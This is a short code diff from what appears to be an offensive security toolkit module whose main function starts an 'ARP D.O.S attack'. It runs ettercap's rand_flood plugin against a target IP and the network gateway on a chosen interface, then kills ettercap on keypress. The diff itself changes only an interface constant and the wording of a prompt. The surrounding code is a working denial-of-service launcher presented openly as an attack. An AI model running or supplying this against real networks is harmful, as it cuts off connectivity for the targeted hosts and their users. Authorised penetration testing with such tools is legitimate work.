@@ -25,10 +25,10 @@ def init():
 
 	# DEFAULT OPTIONS MODULE
 	init.options = {
-		# NAME      VALUE            RQ     DESCRIPTION
-		'interface':["eth0"         ,True ,'Interface'],
-		'target'   :["192.168.1.223",True ,'Target IP'],
-		'gateway'  :[get_gateway()  ,True ,'Gateway IP']
+		# NAME      VALUE               RQ     DESCRIPTION
+		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
+		'target'   :["192.168.1.223"   ,True ,'Target IP'],
+		'gateway'  :[get_gateway()     ,True ,'Gateway IP']
 	}
 	return init
 # END INFORMATION MODULE
@@ -39,7 +39,7 @@ def main(run):
 	if isConect() and checkDevice(init.var['interface']):
 		printAlert(0,"Starting ARP D.O.S attack...")
 		Subprocess("ettercap -Tq -P rand_flood /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
-		raw_input(printAlert(8,"for Stop ARP D.O.S Attack (PRESS [ENTER])\n"))
+		raw_input(printAlert(8,"to Stop ARP D.O.S Attack (PRESS [ENTER])\n"))
 		commands.getoutput("killall ettercap")	
 
 # END CODE MODULE ############################################################################################
